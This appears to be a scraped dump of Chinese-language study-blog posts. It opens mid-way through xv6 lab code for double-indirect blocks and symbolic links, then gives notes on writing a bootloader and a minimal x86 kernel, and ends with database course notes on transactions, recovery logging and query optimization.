balloc(ip-\u0026gt;dev); return addr; } bn -= NDIRECT; if (bn \u0026lt; BLOCKS) { // Load indirect block, allocating if necessary. if((addr = ip-\u0026gt;addrs[NDIRECT]) == 0) ip-\u0026gt;addrs[NDIRECT] = addr = balloc(ip-\u0026gt;dev); @@ -400,6 +401,30 @@ bmap(struct inode *ip, uint bn) brelse(bp); return addr; } bn -= BLOCKS; if (bn \u0026lt; NINDIRECT) { // double indirect int i = bn/BLOCKS, j = bn%BLOCKS; if((addr = ip-\u0026gt;addrs[NDIRECT+1]) == 0) ip-\u0026gt;addrs[NDIRECT+1] = addr = balloc(ip-\u0026gt;dev); bp = bread(ip-\u0026gt;dev, addr); a = (uint*)bp-\u0026gt;data; if((addr = a[i]) == 0){ a[i] = addr = balloc(ip-\u0026gt;dev); log_write(bp); } brelse(bp); // query addr from int[]\u0026#39;s data bp = bread(ip-\u0026gt;dev, addr); a = (uint*)bp-\u0026gt;data; if((addr = a[j]) == 0) { a[j] = addr = balloc(ip-\u0026gt;dev); log_write(bp); } brelse(bp); return addr; } panic(\u0026#34;bmap: out of range\u0026#34;); } void itrunc(struct inode *ip) { int i, j; struct buf *bp; uint *a; for(i = 0; i \u0026lt; NDIRECT; i++){ if(ip-\u0026gt;addrs[i]){ bfree(ip-\u0026gt;dev, ip-\u0026gt;addrs[i]); ip-\u0026gt;addrs[i] = 0; } } if(ip-\u0026gt;addrs[NDIRECT]){ bp = bread(ip-\u0026gt;dev, ip-\u0026gt;addrs[NDIRECT]); a = (uint*)bp-\u0026gt;data; for(j = 0; j \u0026lt; BLOCKS; j++){ if(a[j]) bfree(ip-\u0026gt;dev, a[j]); } brelse(bp); bfree(ip-\u0026gt;dev, ip-\u0026gt;addrs[NDIRECT]); ip-\u0026gt;addrs[NDIRECT] = 0; } uint *b; struct buf *bp2; if(ip-\u0026gt;addrs[NDIRECT+1]){ bp = bread(ip-\u0026gt;dev, ip-\u0026gt;addrs[NDIRECT+1]); a = (uint*)(bp-\u0026gt;data); // int[] for(i = 0; i \u0026lt; BLOCKS; i++){ if (a[i]) { bp2 = bread(ip-\u0026gt;dev, a[i]); b = (uint*)(bp2-\u0026gt;data); for (j = 0; j \u0026lt; BLOCKS; j++) if(b[j]) bfree(ip-\u0026gt;dev, b[j]); brelse(bp2); bfree(ip-\u0026gt;dev, a[i]); } } brelse(bp); bfree(ip-\u0026gt;dev, ip-\u0026gt;addrs[NDIRECT+1]); ip-\u0026gt;addrs[NDIRECT+1] = 0; } ip-\u0026gt;size = 0; iupdate(ip); } symbol link 一個有path的檔案\nsyscall要先生出檔案，把path寫進去\nuint64 sys_symlink(void) { int n; char target[MAXPATH], path[MAXPATH]; struct inode *ip; if((n = argstr(0, target, MAXPATH)) \u0026lt; 0 || argstr(1, path, MAXPATH) \u0026lt; 0) return -1; begin_op(); ip = create(path, T_SYMLINK, 0, 0); for (int i=0, r = 0, n1 = 0, off = 0;i \u0026lt; n \u0026amp;\u0026amp; r == n1; i += r){ n1 = n - i; if ((r = writei(ip, 0, (uint64)target + i, off, n1)) \u0026gt; 0) off += r; } ip-\u0026gt;nlink = 1; iunlockput(ip); end_op(); return 0; } open要能處理symbol link，與原本的檔案 如果遇到其他symbol link還要繼續follow\n抄原本的open，加symbol link的處理，最後遞迴\nuint64 real_open(char path[MAXPATH], int omode, int follow) { int fd; struct file *f; struct inode *ip; if(omode \u0026amp; O_CREATE){ ip = create(path, T_FILE, 0, 0); if(ip == 0){ return -1; } } else { if((ip = namei(path)) == 0){ return -1; } ilock(ip); if(ip-\u0026gt;type == T_DIR \u0026amp;\u0026amp; omode != O_RDONLY){ iunlockput(ip); return -1; } } if(ip-\u0026gt;type == T_DEVICE \u0026amp;\u0026amp; (ip-\u0026gt;major \u0026lt; 0 || ip-\u0026gt;major \u0026gt;= NDEV)){ iunlockput(ip); return -1; } if (ip-\u0026gt;type == T_SYMLINK) { if (!(omode \u0026amp; O_NOFOLLOW)) { char target[MAXPATH]; if (follow \u0026gt; FOLLOW_DEPS || readi(ip, 0, (uint64)target, 0, MAXPATH) \u0026lt; 0) { iunlockput(ip); return -1; } iunlock(ip); return real_open(target, omode, follow+1); } } if((f = filealloc()) == 0 || (fd = fdalloc(f)) \u0026lt; 0){ if(f) fileclose(f); iunlockput(ip); return -1; } if(ip-\u0026gt;type == T_DEVICE){ f-\u0026gt;type = FD_DEVICE; f-\u0026gt;major = ip-\u0026gt;major; } else { f-\u0026gt;type = FD_INODE; f-\u0026gt;off = 0; } f-\u0026gt;ip = ip; f-\u0026gt;readable = !(omode \u0026amp; O_WRONLY); f-\u0026gt;writable = (omode \u0026amp; O_WRONLY) || (omode \u0026amp; O_RDWR); if((omode \u0026amp; O_TRUNC) \u0026amp;\u0026amp; ip-\u0026gt;type == T_FILE){ itrunc(ip); } iunlock(ip); return fd; } uint64 sys_open(void) { char path[MAXPATH]; int omode; int n; if((n = argstr(0, path, MAXPATH)) \u0026lt; 0 || argint(1, \u0026amp;omode) \u0026lt; 0) return -1; begin_op(); uint64 ret = real_open(path, omode, 0); end_op(); return ret; } Ref 可以在google找到很多其他人的做法，都值得參考\nMIT6.S081 操作系统工程中文翻译 xv6-book-2020-Chinese\n","permalink":"https://littlebees.github.io/2022/01/xv6-labs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWhat I can not create I do not understand.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e6.s081是個了解unix與c語言的超讚課程\u003c/p\u003e\n\u003cp\u003e有許多符合自修性質\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e有實作\u003c/li\u003e\n\u003cli\u003e有test\u003c/li\u003e\n\u003cli\u003e有解答可以參考\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e這篇是我讀pdf(有人翻譯2020的pdf，所以有些句子可能看起來怪怪的)與lab的筆記\nlab是2020版，6.s081有經歷幾次改版，lab的內容會換一下，尤其是2019到2020差有點多\u003c/p\u003e","title":"xv6 labs"},{"content":"動機 這篇主要在看怎麼從最一開始到一個可以打字的kernel的過程 重點不是裡面的code，而是過程\n因為真正讓人痛苦的東西其實是在os提供的各種抽象設施，也是progammer要在意的點\n開始之前 可以直接看下面的說明，如果想跑跑看可以照下面的步驟\n裝docker(不想重編toolchain), nasm, build-essential, gdb, qemu-x86 clone 這個 checkout到想看的commit去跑 從硬碟出發: bootloader bootloader boot sector是bios第一個讀的sector，sector大小是512 bytes bootloader會放在這裡\nbootloaer的程式會被bios放在mem的0x7c00\nbios會去找aa55，以這個為終點\n所以bootloader的咒語是\n[org 0x7c00] ; 在做c的星號時直接加0x7c00 ; command ... ; $ :: 現在位置 ; $$ :: 前一個指令的位置 times 510-($-$$) db 0 dw 0xaa55 aa55佔2 bytes，之後就是用0填滿 $是現在的位置，$$是前一個指令的位置\nia32 programming assembler: 讀code，算位置，噴binary(或是elf)\nbyte, word, double word(dword) byte: 8bits word: 2bytes dword: 4bytes\n之後要用ia32去生\nbyte: db word: dw dword: dd\nnasm的output長什麼樣子 db 0x0 db 0xb5 dw 0x0 dw 0xc5 dd 0x0 dw 0xd5 output\n00000000: 00b5 0000 c500 0000 0000 d500 ............ db 0xb5 db 0x0 dw 0xc5 db 0x0 dd 0xd5 db 0x0 output\n00000000: b500 c500 00d5 0000 0000 .......... byte: 兩格 word: 四格 dword: 八格\n一格大小是0.5byte (hex, 4bits)\nmode 16bits real mode 定址範圍是1MB 可以用bios的handler去操作裝置 只要知道mem的addr就可以改 32bits protected mode 定址範圍是4GB 沒有bios的handler可以用\u0026hellip; 所以要自己寫driver 有GDT可以控制權限 memory address 16bits real mode: segmentation Physical Address = Segment * 16 + Offset 就是左移1格\nds是data segmentation的base reg\nmov ah, 0x0e ; tty mov bx, 0x7c0 ; 移1格 mov ds, bx ; WARNING: from now on all memory references will be offset by \u0026#39;ds\u0026#39; implicitly mov al, [the_secret] int 0x10 mov al, [es:the_secret] int 0x10 ; doesn\u0026#39;t look right... isn\u0026#39;t \u0026#39;es\u0026#39; currently 0x000? mov bx, 0x7c0 mov es, bx mov al, [es:the_secret] int 0x10 jmp $ the_secret: db \u0026#34;X\u0026#34; times 510 - ($-$$) db 0 dw 0xaa55 32bits protected mode: GDT GDT就是區分mem的表，除了標長度、起點還可以設定權限(ring1~3就是這裡來的)\nGDT最少要有兩個segment，包含start!!\n但設定的樣子十分反人類\ngdt_start: ; don\u0026#39;t remove the labels, they\u0026#39;re needed to compute sizes and jumps ; the GDT starts with a null 8-byte dd 0x0 ; 4 byte dd 0x0 ; 4 byte ; GDT for code segment. base = 0x00000000, length = 0xfffff ; for flags, refer to os-dev.pdf document, page 36 gdt_code: dw 0xffff ; segment length, bits 0-15 dw 0x0 ; segment base, bits 0-15 db 0x0 ; segment base, bits 16-23 db 10011010b ; flags (8 bits) db 11001111b ; flags (4 bits) + segment length, bits 16-19 db 0x0 ; segment base, bits 24-31 ; GDT for data segment. base and length identical to code segment ; some flags changed, again, refer to os-dev.pdf gdt_data: dw 0xffff dw 0x0 db 0x0 db 10010010b db 11001111b db 0x0 gdt_end: ; GDT descriptor gdt_descriptor: dw gdt_end - gdt_start - 1 ; size (16 bit), always one less of its true size dd gdt_start ; address (32 bit) ; define some constants for later use CODE_SEG equ gdt_code - gdt_start DATA_SEG equ gdt_data - gdt_start 詳細的flag可以看這裡\n之後就可以load他\nlgdt [gdt_descriptor] bootloader的工作 載入kernel Q: 為什麼不在32bits保護模式載入kernel? A: 現在還可以讓bios幫我們load，只要打中斷就好\nINT 13,2 - Read Disk Sectors\nKERNEL_OFFSET equ 0x1000 disk_load: pusha ; reading from disk requires setting specific values in all registers ; so we will overwrite our input parameters from \u0026#39;dx\u0026#39;. Let\u0026#39;s save it ; to the stack for later use. push dx mov ah, 0x02 ; ah \u0026lt;- int 0x13 function. 0x02 = \u0026#39;read\u0026#39; mov al, dh ; al \u0026lt;- number of sectors to read (0x01 .. 0x80) mov cl, 0x02 ; cl \u0026lt;- sector (0x01 .. 0x11) ; 0x01 is our boot sector, 0x02 is the first \u0026#39;available\u0026#39; sector mov ch, 0x00 ; ch \u0026lt;- cylinder (0x0 .. 0x3FF, upper 2 bits in \u0026#39;cl\u0026#39;) ; dl \u0026lt;- drive number. Our caller sets it as a parameter and gets it from BIOS ; (0 = floppy, 1 = floppy2, 0x80 = hdd, 0x81 = hdd2) mov dh, 0x00 ; dh \u0026lt;- head number (0x0 .. 0xF) ; [es:bx] \u0026lt;- pointer to buffer where the data will be stored ; caller sets it up for us, and it is actually the standard location for int 13h int 0x13 ; BIOS interrupt jc disk_error ; if error (stored in the carry bit) pop dx cmp al, dh ; BIOS also sets \u0026#39;al\u0026#39; to the # of sectors read. Compare it. jne sectors_error popa ret disk_error: mov bx, DISK_ERROR call print_16 call print_nl_16 jmp disk_loop sectors_error: mov bx, SECTORS_ERROR call print_16 disk_loop: jmp $ DISK_ERROR: db \u0026#34;Disk read error\u0026#34;, 0 SECTORS_ERROR: db \u0026#34;Incorrect number of sectors read\u0026#34;, 0 [bits 16] load_kernel: mov bx, MSG_LOAD_KERNEL call print_16 call print_nl_16 mov bx, KERNEL_OFFSET ; Read from disk and store in 0x1000 mov dh, 2 mov dl, [BOOT_DRIVE] call disk_load ret [bits 32] start_kernel: call KERNEL_OFFSET jmp $ MSG_LOAD_KERNEL db \u0026#34;Loading kernel into memory\u0026#34;, 0 切32bit保護模式 載入kernel後，就是切保護模式與設定pagetable 剩下就可以寫c了\n[bits 16] switch_to_pm: cli ; 1. disable interrupts lgdt [gdt_descriptor] mov eax, cr0 or eax, 0x1 ; 3. set 32-bit mode bit in cr0 mov cr0, eax jmp CODE_SEG:init_pm ; 4. far jump by using a different segment [bits 32] init_pm: ; we are now using 32-bit instructions mov ax, DATA_SEG ; 5. update the segment registers mov ds, ax mov ss, ax mov es, ax mov fs, ax mov gs, ax mov ebp, 0x90000 ; 6. update the stack right at the top of the free space mov esp, ebp call BEGIN_PM ; 7. Call a well-known label with useful code [bits 32] BEGIN_PM: ; after the switch we will get here mov ebx, MSG_PROT_MODE call print_32 ; Note that this will be written at the top left corner call start_kernel jmp $ BOOT_DRIVE db 0 ; It is a good idea to store it in memory because \u0026#39;dl\u0026#39; may get overwritten MSG_REAL_MODE db \u0026#34;Started in 16-bit real mode\u0026#34;, 0 MSG_PROT_MODE db \u0026#34;Loaded 32-bit protected mode\u0026#34;, 0 怎麼把bootloader與kernel合在一起? 兩個都是binary，直接接起來 接起來的就是一個硬碟\ncat boot.bin kernel.bin \u0026gt; os-image.bin 因為沒有要控制資料擺放位子(memory layout)，所以這裡就直接接起來 但之後看xv6會看到linker的部分，去調整kernel裡面怎麼放東西\n在記憶體了: kernel kernel如何操作裝置? 操作裝置的方式有兩種\n透過port 透過mapped的memory video driver 透過port去讀cursor的訊息 先port in需要什麼參數，之後port out去讀\nunsigned char port_byte_in (unsigned short port) { unsigned char result; /* Inline assembler syntax * !! Notice how the source and destination registers are switched from NASM !! * * \u0026#39;\u0026#34;=a\u0026#34; (result)\u0026#39;; set \u0026#39;=\u0026#39; the C variable \u0026#39;(result)\u0026#39; to the value of register e\u0026#39;a\u0026#39;x * \u0026#39;\u0026#34;d\u0026#34; (port)\u0026#39;: map the C variable \u0026#39;(port)\u0026#39; into e\u0026#39;d\u0026#39;x register * * Inputs and outputs are separated by colons */ __asm__(\u0026#34;in %%dx, %%al\u0026#34; : \u0026#34;=a\u0026#34; (result) : \u0026#34;d\u0026#34; (port)); return result; } void port_byte_out (unsigned short port, unsigned char data) { /* Notice how here both registers are mapped to C variables and * nothing is returned, thus, no equals \u0026#39;=\u0026#39; in the asm syntax * However we see a comma since there are two variables in the input area * and none in the \u0026#39;return\u0026#39; area */ __asm__(\u0026#34;out %%al, %%dx\u0026#34; : : \u0026#34;a\u0026#34; (data), \u0026#34;d\u0026#34; (port)); } unsigned short port_word_in (unsigned short port) { unsigned short result; __asm__(\u0026#34;in %%dx, %%ax\u0026#34; : \u0026#34;=a\u0026#34; (result) : \u0026#34;d\u0026#34; (port)); return result; } void port_word_out (unsigned short port, unsigned short data) { __asm__(\u0026#34;out %%ax, %%dx\u0026#34; : : \u0026#34;a\u0026#34; (data), \u0026#34;d\u0026#34; (port)); } int get_cursor_offset() { /* Use the VGA ports to get the current cursor position * 1. Ask for high byte of the cursor offset (data 14) * 2. Ask for low byte (data 15) */ port_byte_out(REG_SCREEN_CTRL, 14); int offset = port_byte_in(REG_SCREEN_DATA) \u0026lt;\u0026lt; 8; /* High byte: \u0026lt;\u0026lt; 8 */ port_byte_out(REG_SCREEN_CTRL, 15); offset += port_byte_in(REG_SCREEN_DATA); return offset * 2; /* Position * size of character cell */ } 透過video memory去印文字 video memory是一格pixel對到兩個記憶體 第一個是文字 第二個是顏色\nint print_char(char c, int col, int row, char attr) { unsigned char *vidmem = (unsigned char*) VIDEO_ADDRESS; if (!attr) attr = WHITE_ON_BLACK; /* Error control: print a red \u0026#39;E\u0026#39; if the coords aren\u0026#39;t right */ if (col \u0026gt;= MAX_COLS || row \u0026gt;= MAX_ROWS) { vidmem[2*(MAX_COLS)*(MAX_ROWS)-2] = \u0026#39;E\u0026#39;; // HERE vidmem[2*(MAX_COLS)*(MAX_ROWS)-1] = RED_ON_WHITE; // HERE return get_offset(col, row); } int offset; if (col \u0026gt;= 0 \u0026amp;\u0026amp; row \u0026gt;= 0) offset = get_offset(col, row); else offset = get_cursor_offset(); if (c == \u0026#39;\\n\u0026#39;) { row = get_offset_row(offset); offset = get_offset(0, row+1); } else { vidmem[offset] = c; // HERE vidmem[offset+1] = attr; // HERE offset += 2; } set_cursor_offset(offset); return offset; } kernel如何與cpu互動? kernel -\u0026gt; cpu: 指令 cpu \u0026lt;-\u0026gt; kernel: 中斷 中斷有分\n例外 裝置 但兩個其實差不多\n例外 宣告表(callback) global isr0 global isr1 global isr2 isr0: cli push byte 0 push byte 0 jmp isr_common_stub ; 1: Debug Exception isr1: cli push byte 0 push byte 1 jmp isr_common_stub ; 2: Non Maskable Interrupt Exception isr2: cli push byte 0 push byte 2 jmp isr_common_stub 設定handler 也就是做ctx switch(把register存下來，之後寫回去)，之後call handler\nQ: register存在哪? A: 目前的stack上 (之後xv6會是在自己的process上)\nisr_common_stub: ; 1. Save CPU state pusha ; Pushes edi,esi,ebp,esp,ebx,edx,ecx,eax mov ax, ds ; Lower 16-bits of eax = ds. push eax ; save the data segment descriptor mov ax, 0x10 ; kernel data segment descriptor mov ds, ax mov es, ax mov fs, ax mov gs, ax ; 2. Call C handler call isr_handler ; 3. Restore state pop eax mov ds, ax mov es, ax mov fs, ax mov gs, ax popa add esp, 8 ; Cleans up the pushed error code and pushed ISR number sti iret ; pops 5 things at once: CS, EIP, EFLAGS, SS, and ESP 轉到function void isr_handler(registers_t r) { kprint(\u0026#34;received interrupt: \u0026#34;); char s[3]; int_to_ascii(r.int_no, s); kprint(s); kprint(\u0026#34;\\n\u0026#34;); kprint(exception_messages[r.int_no]); kprint(\u0026#34;\\n\u0026#34;); } 裝置 裝置的irq其實差不多 (所以xv6是兩個一起處理的)\n這裡看個鍵盤的例子，鍵盤就是透過port讀打了什麼之後轉成char，印出來\n#define BACKSPACE 0x0E #define ENTER 0x1C static char key_buffer[256]; #define SC_MAX 57 const char *sc_name[] = { \u0026#34;ERROR\u0026#34;, \u0026#34;Esc\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;5\u0026#34;, \u0026#34;6\u0026#34;, \u0026#34;7\u0026#34;, \u0026#34;8\u0026#34;, \u0026#34;9\u0026#34;, \u0026#34;0\u0026#34;, \u0026#34;-\u0026#34;, \u0026#34;=\u0026#34;, \u0026#34;Backspace\u0026#34;, \u0026#34;Tab\u0026#34;, \u0026#34;Q\u0026#34;, \u0026#34;W\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;R\u0026#34;, \u0026#34;T\u0026#34;, \u0026#34;Y\u0026#34;, \u0026#34;U\u0026#34;, \u0026#34;I\u0026#34;, \u0026#34;O\u0026#34;, \u0026#34;P\u0026#34;, \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;Enter\u0026#34;, \u0026#34;Lctrl\u0026#34;, \u0026#34;A\u0026#34;, \u0026#34;S\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;F\u0026#34;, \u0026#34;G\u0026#34;, \u0026#34;H\u0026#34;, \u0026#34;J\u0026#34;, \u0026#34;K\u0026#34;, \u0026#34;L\u0026#34;, \u0026#34;;\u0026#34;, \u0026#34;\u0026#39;\u0026#34;, \u0026#34;`\u0026#34;, \u0026#34;LShift\u0026#34;, \u0026#34;\\\\\u0026#34;, \u0026#34;Z\u0026#34;, \u0026#34;X\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;V\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;N\u0026#34;, \u0026#34;M\u0026#34;, \u0026#34;,\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;/\u0026#34;, \u0026#34;RShift\u0026#34;, \u0026#34;Keypad *\u0026#34;, \u0026#34;LAlt\u0026#34;, \u0026#34;Spacebar\u0026#34;}; const char sc_ascii[] = { \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;Q\u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;U\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;P\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;S\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;G\u0026#39;, \u0026#39;H\u0026#39;, \u0026#39;J\u0026#39;, \u0026#39;K\u0026#39;, \u0026#39;L\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;Z\u0026#39;, \u0026#39;X\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;M\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39; \u0026#39;}; static void keyboard_callback(registers_t regs) { /* The PIC leaves us the scancode in port 0x60 */ uint8_t scancode = port_byte_in(0x60); if (scancode \u0026gt; SC_MAX) return; if (scancode == BACKSPACE) { backspace(key_buffer); kprint_backspace(); } else if (scancode == ENTER) { kprint(\u0026#34;\\n\u0026#34;); user_input(key_buffer); /* kernel-controlled function */ key_buffer[0] = \u0026#39;\\0\u0026#39;; } else { char letter = sc_ascii[(int)scancode]; /* Remember that kprint only accepts char[] */ char str[2] = {letter, \u0026#39;\\0\u0026#39;}; append(key_buffer, letter); kprint(str); } UNUSED(regs); } void init_keyboard() { register_interrupt_handler(IRQ1, keyboard_callback); } 之後哩 到此已經可以\n開機 打字 print 可以當成整台電腦只有我們這一個process，就是整台電腦 (所以可以反過來看，只要有process就是有了一台電腦的幻覺)\n但如果要讓多個process一起用時? 或是應該問，我們還缺什麼?\nprocess mem management concurrent user/kernel mode filesystem 之後到xv6一邊看實作，一邊做lab\nRef os-tutorial Overview of IA-32 assembly programming Which variable size to use (db, dw, dd) with x86 assembly? x86 Assembly Guide\n","permalink":"https://littlebees.github.io/2022/01/%E9%9B%BB%E8%85%A6%E5%BE%9E0%E9%96%8B%E5%A7%8B/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這篇主要在看怎麼從最一開始到一個可以打字的kernel的過程\n重點不是裡面的code，而是過程\u003c/p\u003e\n\u003cp\u003e因為真正讓人痛苦的東西其實是在os提供的各種抽象設施，也是progammer要在意的點\u003c/p\u003e","title":"電腦從0開始"},{"content":"動機 我之前學的DB根本就是假的 這是來自nthu的DB課程，有slide但沒有prjects\n難道之後要跑CMU 15-445嗎? 不過有一說一，DB越看與xv6的fs真的很像，除了沒有SQL的部分\nWhy not file systems? query可以組合 以tx為單位 ACID!! 有辦法recover 讓recover的資料一致 query怎麼處理? SELECT p.id, p.text FROM posts AS p, users AS u WHERE u.id = p.authorId AND u.name=\u0026#39;Bob\u0026#39; AND p.text ILIKE \u0026#39;%db%\u0026#39;; Query Optimization: plan EXPLAIN EXPLAIN ANALYZE -- show plan tree SELECT * FROM users WHERE id\u0026lt;5 AND name ILIKE \u0026#39;%User%\u0026#39; ORDER BY id DESC LIMIT 2; filter, zip, select (where, join, select) FROM posts AS p, users AS u WHERE u.id = p.authorId AND u.name=\u0026lsquo;Bob\u0026rsquo; AND p.text ILIKE \u0026lsquo;%db%\u0026rsquo; SELECT p.id, p.text Handling “Big” Data when deleting NO ACTION (default): user not deleted, error raised CASCADE: user and all referencing posts deleted Query Optimization: index index 一個mapping function 加速 equality 或是 range selections equality hashing function key到一堆有關的值 其他hash function的issue去看資料結構 range selections B-Tree 最後map到一堆有關的值 每一個node就是放起點的list how to lock? Lock Crabbing Protocol Input: field values or ranges search key Primary index vs. secondary index index中有沒有Primary key Output: rids (record的id) 因為是根據field建tree或hash，所以如果有改row，就要更新index Faster reads at the cost of slower writes inverted index concurency 說好的ACID Atomicity: all or nothing 通常只有這個 Consistent: db的整體狀態是對的 Isolation: 這才是我印象中的atomic 要自己來 Duration: 資料庫內的資料不會因為斷電，系統崩潰而損失資料。 總的來說，tx根本就是一般function (但會rollback)\n怎麼出事 Dirty Read: 有人讀還沒commit的欄位 如果之後這個欄位被rollback\u0026hellip; 可能好: 最後有被commited 不好: 被rollback，之前看的資料就沒效了 Non Repeatable read: (在tx中) 讀同個row兩次的結果不一樣 (race condition) row為單位的race condition Phantom Read: (在tx中) 同個query拿到的rows不一樣 (race condition) table為單位的race condition (在條件上race condition) Serialization Anomaly: 因為tx commit的順序不同導致最後結果inconsistence reorder Isolation Read Uncommitted: 沒有任何保證 Read Committed: 寫完的不會變了 (mem consistency) 可以用read lock與write lock來保證 鎖在tx的執行啟動與完成 (mutual exclusion) Repeatable Read: (就是名字寫的) 可以用read lock與write lock來保證 鎖在有用到的所有row Serialisable: tx跑起來與serial一樣 dependency (mem barrier) 工具 lock Pessimistic (Exclusive): mutex Optimistic (Shared): read/write lock 或是 seq lock snapshot: row versioning(MVCC): 就是row的持久化，每一個tx的更新對row來說都是一個版本的更新 Two Phase Locking: 先把lock全部拿完，開跑 到最後再把lock還回去 Ref How does a database server handle thousands of concurrent requests? On Concurrency Control in Databases\nDB Architecture Server and infrastructures (jdbc, sql, tx, and utils) Transaction Concurrency 2PC lock protocol 要用就先拿lock，用完馬上unlock strict 2PC lock protocol 一次拿完所有需要的lock，tx完成後unlock Multiple-Granularity Locks: allows users to set locks on objects that contain other objects Recovery 定義Failure Transaction hangs System hangs/crashes Assumptions Contents in nonvolatile storage are not corrupted No Byzantine failure (zombies) Other types of failure will be dealt with in other ways Log 就是紀錄做過的動作 紀錄在? cache failure時可能會消失 log file failure後依然存在 只要有就是真的做過!! 動作有? 操作 實際上的操作 with tx id 改值、table等等 mark tx 開始、commit rollback 目的是? Recovery: Rollback未完成/已完成的tx 未完成的tx: 在log file Rollback: 把tx取消掉 動作 從尾開始 undo對到tx id的item 直到遇到tx id的start Checkpoint 幫log分界，不然每次都跑整條其實很慢 Checkpoint之前的commit可以不用管!! Quiescent Checkpointing 動作 關tx 等現在正在跑的tx好 (可能很久) flush all buffer 把checkpoint寫到log cache，再到log file 開tx Nonquiescent Checkpointing 動作 關tx 在checkpoint的log中記錄現在正在跑的tx的tx id flush all buffer 把checkpoint寫到log cache，再到log file 開tx 怎麼Recovery Undo-only Recovery Log有 commit flush改完的block 塞commit log到buffer 塞到log file rollback flush改完的block 塞commit log到buffer 塞到log file 動作 從尾到頭，看每個item 紀錄commit、rollback的tx id 做完的 實際上的操作 tx id有看過? 沒事 沒看過? undo UNDO-REDO recovery 1 Log有 commit flush改完的block 塞commit log到buffer 塞到log file rollback flush改完的block 塞commit log到buffer 塞到log file 動作 UNDO (消除uncommit的影響) 從尾到頭，看每個item 紀錄commit、rollback的tx id 做完的 實際上的操作 tx id有看過? 沒事 沒看過? undo REDO (讓commit保證存在) 從頭到尾，看每個item 在commit list的item redo 動作重複做沒關係嗎? 都是set value，沒差，反正順序對 idempotent UNDO-REDO recovery 2 Log有 commit flush改完的block 塞commit log到buffer 塞到log file rollback flush改完的block 塞commit log到buffer 塞到log file 動作 UNDO (消除uncommit的影響) 從尾到頭，看每個item 紀錄commit、rollback的tx id 做完的 實際上的操作 tx id有看過? 沒事 沒看過? undo REDO (讓commit保證存在) 從頭到尾，看每個item 在commit list的item redo 動作重複做沒關係嗎? 都是set value，沒差，反正順序對 idempotent Redo-Only Recovery steal tx中改過的block可能在commit完成前就被swap出去!! 如果沒有steal 只要redo就好 因為會到log file的state與HDD的一定一致 Repeating history Early Lock Release meta-structrue的lock會提早釋放 (但block不釋放lock) 不然要操作其他block時無法concurrent 變成要等meta-struct 變成block與meta的更新會不一致!! Logical Operations 不能根據當時的state做直接的undo state可能被其他tx變了，雖然block有lock，但meta沒有!! 這也代表undo不是idempotent undo也是屬於一般的動作了 也要記到log Rollback Logical Operations (soft delete) 卡在中間? 把剩下的直接undo 跑完了? 先拿要拿的所有lock 再undo Recovery by Repeating History REDO (重建現場) 從最近的checkpoint，開始重作所有動作 UNDO (消去未完成tx的影響) 看REDO-UNDO recovery Logical OPs怎麼處理? 卡在中間? 把剩下的直接undo 跑完了? skip (soft delete) 原本現在連undo都要log，所以有另一個名字 Compensation Logs Physiological logging (op reorder你敢信) 把一些OPs集中成一個Logical Operation 可以省log大小 但原本執行上的dependency沒了 不能直接REDO REDO-UNDO Recovery in Physiological logging REDO (重建現場) 跳過已經redo過的Physiological logging how? skip, in ARIES algorithm UNDO (消去未完成tx的影響) 把Physiological logging當成一個op去undo Query engine 把SQL compile 成 AST (relational algebra) relational algebra 做plan(選tree的樣子，做cost estimation) cost estimation\n定義cost\nnumber of block accesses: 掃到多少block B(p) 有多少record被output: R(p) 在p table中的f field的值域大小: V(p,f) index的成本: SearchCost(p,f) 跑跑看\nR(student)=10000 B(student)=1000 B(dept)= 500 selectivity(s-id=5\u0026amp;major-id=4)=0.01 Left: (1000+10000*500)*10ms = 13.9 hours Right: (1000+100000.01500)*10ms = 8.4 mins estimate this cost\n值域很大，不可能1對1的去看 分區!! 怎麼算、怎麼實作 skip (見 Query Optimization) Generate trees\nNot finding the best tree Avoiding bad trees!! consider left-skew candidate trees only 在join時，大部分都是走訪右邊 Goal ↓B(root) reduced to ↓R(c1) Pushing Select ops down 越早select越好 Greedy Join ordering 只要確保每次join是最小，最後就是最小 (DP) Selinger-Style Optimizer Deterministic Query Planning Algorithm\n從from拉table\n跑where\n再跑select\ngroup by, having? 